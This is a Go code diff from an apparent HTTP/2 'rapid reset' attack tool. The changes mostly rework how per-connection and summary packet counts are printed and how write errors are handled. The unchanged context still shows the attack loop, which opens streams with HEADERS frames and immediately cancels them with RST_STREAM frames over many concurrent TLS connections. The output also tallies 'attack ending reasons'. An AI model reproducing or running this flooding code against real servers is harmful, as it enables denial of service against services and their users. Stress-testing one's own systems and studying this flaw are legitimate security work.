@@ -109,47 +109,43 @@ func main() {
 		go execute(serverUrl, conf, ch, i)
 	}
 
-	var summary ReadFrameSummary
-	for rfr := range ch {
-		log.Printf("%v", rfr)
-		summary.Add(rfr)
-	}
 	summarize(ch)
 }
 
 func summarize(ch <-chan ReadFrameResult) {
 	var summary ReadFrameSummary
-
-	for rfr := range ch {
-		printResult(rfr)
+	for i := 0; i < *connections; i++ {
+		rfr := <-ch
+		fmt.Printf("got result on conn %v\n", rfr.Conn)
+		defer printResult(rfr) //this is deferred purely for formatting reasons - i might have to use a sync.WaitGroup here, but this will work for now.
 		summary.Add(rfr)
 	}
-	fmt.Println(strings.Repeat("#", 20) + "SUMMARY" + strings.Repeat("#", 20))
+	fmt.Println(strings.Repeat("\n", 10) + strings.Repeat("#", 20) + "SUMMARY" + strings.Repeat("#", 20))
 	fmt.Println("Packet types received:")
-	fmt.Printf("\t PING: %d\n", summary.Ping)
-	fmt.Printf("\t HEADERS: %d\n", summary.Headers)
-	fmt.Printf("\t SETTINGS: %d\n", summary.Settings)
-	fmt.Printf("\t DATA: %d\n", summary.Data)
-	fmt.Printf("\t GOAWAY: %d\n", summary.GoAway)
-	fmt.Printf("\t RSTSTREAM: %d\n", summary.RSTStream)
-	fmt.Printf("\t WINDOWUPDATE: %d\n", summary.WindowUpdate)
-	fmt.Printf("\t UNKNOWN: %d\n", summary.Unknown)
+	fmt.Printf("\tPING: %d\n", summary.Ping)
+	fmt.Printf("\tHEADERS: %d\n", summary.Headers)
+	fmt.Printf("\tSETTINGS: %d\n", summary.Settings)
+	fmt.Printf("\tDATA: %d\n", summary.Data)
+	fmt.Printf("\tGOAWAY: %d\n", summary.GoAway)
+	fmt.Printf("\tRSTSTREAM: %d\n", summary.RSTStream)
+	fmt.Printf("\tWINDOWUPDATE: %d\n", summary.WindowUpdate)
+	fmt.Printf("\tUNKNOWN: %d\n", summary.Unknown)
 	fmt.Println("Attack ending reasons (per receiving thread):")
-	fmt.Printf("\t GoAway events: %d\n", summary.GoAwayEvents)
-	fmt.Printf("\t Timeout events: %d\n", summary.TimeoutEvents)
-	fmt.Printf("\t Error events: %d\n", summary.ErrorEvents)
+	fmt.Printf("\tGoAway events: %d\n", summary.GoAwayEvents)
+	fmt.Printf("\tTimeout events: %d\n", summary.TimeoutEvents)
+	fmt.Printf("\tError events: %d\n", summary.ErrorEvents)
 }
 
 func printResult(result ReadFrameResult) {
-	fmt.Printf("Summary for connection %d", result.Conn)
-	fmt.Printf("\t PING: %d\n", result.Ping)
-	fmt.Printf("\t HEADERS: %d\n", result.Headers)
-	fmt.Printf("\t SETTINGS: %d\n", result.Settings)
-	fmt.Printf("\t DATA: %d\n", result.Data)
-	fmt.Printf("\t GOAWAY: %d\n", result.GoAway)
-	fmt.Printf("\t RSTSTREAM: %d\n", result.RSTStream)
-	fmt.Printf("\t WINDOWUPDATE: %d\n", result.WindowUpdate)
-	fmt.Printf("\t UNKNOWN: %d\n", result.Unknown)
+	fmt.Printf("Summary for connection %d\n", result.Conn)
+	fmt.Printf("\tPING: %d\n", result.Ping)
+	fmt.Printf("\tHEADERS: %d\n", result.Headers)
+	fmt.Printf("\tSETTINGS: %d\n", result.Settings)
+	fmt.Printf("\tDATA: %d\n", result.Data)
+	fmt.Printf("\tGOAWAY: %d\n", result.GoAway)
+	fmt.Printf("\tRSTSTREAM: %d\n", result.RSTStream)
+	fmt.Printf("\tWINDOWUPDATE: %d\n", result.WindowUpdate)
+	fmt.Printf("\tUNKNOWN: %d\n", result.Unknown)
 
 	var reason string
 	switch result.Err {
@@ -162,7 +158,7 @@ func printResult(result ReadFrameResult) {
 	default:
 		reason = "Unexpected result"
 	}
-	fmt.Printf("Reason for stopping to listen for more packets: %s", reason)
+	fmt.Printf("\tReason for stopping to listen for more packets: %s\n", reason)
 }
 
 func execute(serverUrl *url.URL, conf *tls.Config, ch chan<- ReadFrameResult, connId int) {
@@ -219,7 +215,7 @@ func readFrames(conn *tls.Conn, connId int) ReadFrameResult {
 		Conn: connId,
 	}
 
-	readDuration := time.Duration(10) * time.Second
+	readDuration := 10 * time.Second
 	for {
 		conn.SetReadDeadline(time.Now().Add(readDuration))
 		frame, err := framer.ReadFrame()
@@ -261,7 +257,8 @@ func attack(framer *http2.Framer, url *url.URL, streamCounter *atomic.Uint32) {
 		streamCounter.Add(2)
 		err := framer.WriteHeaders(createHeaderFrameParam(url, streamId))
 		if err != nil {
-			log.Fatalf("unable to send initial HEADERS frame")
+			log.Println("unable to send initial HEADERS frame")
+			return
 		}
 		log.Printf("sent initial headers on stream %d", streamId)
 
@@ -270,7 +267,8 @@ func attack(framer *http2.Framer, url *url.URL, streamCounter *atomic.Uint32) {
 
 		err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
 		if err != nil {
-			log.Fatalf("unable to write RST_STREAM frame: %v", err)
+			log.Printf("unable to write RST_STREAM frame: %v", err)
+			return
 		}
 		log.Print("Wrote RST_STREAM frame")
 	}
